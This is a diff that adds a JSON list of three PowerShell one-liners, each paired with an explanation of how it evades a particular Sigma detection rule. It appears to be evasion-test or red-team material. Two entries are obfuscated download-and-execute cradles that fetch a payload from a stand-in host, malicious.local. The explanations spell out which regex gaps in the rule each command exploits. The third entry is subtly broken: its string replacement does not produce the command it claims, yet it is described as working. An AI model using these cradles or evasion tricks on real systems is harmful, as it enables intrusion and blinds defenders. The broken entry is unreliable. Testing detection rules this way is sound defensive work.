@@ -1,0 +1,14 @@
+[
+  {
+    "output": "powershell.exe -c \"&('In'+'voke-E'+'xpression') (.('Ne'+'w-Ob'+'ject') Net.WebClient).DownloadString('[http://malicious.local/payload](http://malicious.local/payload)')\"",
+    "explanation": "Bypasses the rule because string concatenation using single quotes and plus signs is explicitly noted as a 'TODO: fixme' in the Sigma rule and currently lacks an active regex pattern. It avoids backticks and the format string (-f) operator."
+  },
+  {
+    "output": "powershell.exe -c \"$c1='Invoke-'; $c2='Expression'; $run=$c1+$c2; &$run (.('New-Object') Net.WebClient).DownloadString('[http://malicious.local/payload](http://malicious.local/payload)')\"",
+    "explanation": "Bypasses the regex filters by assigning split strings to variables and then concatenating them before execution via the call operator (&). The rule's regular expressions checking for backtick insertion and '-f' formatting are completely evaded."
+  },
+  {
+    "output": "powershell.exe -c \"&( 'nxvxkxx-xxprxssixn' -replace 'x','e' -replace 'n','I' )\"",
+    "explanation": "Uses the '-replace' operator for string manipulation instead of the '-f' format operator or backticks. Since the rule looks specifically for the '\"{0}\" -f' pattern or backticks placed inside words, character replacement safely evades detection."
+  }
+]
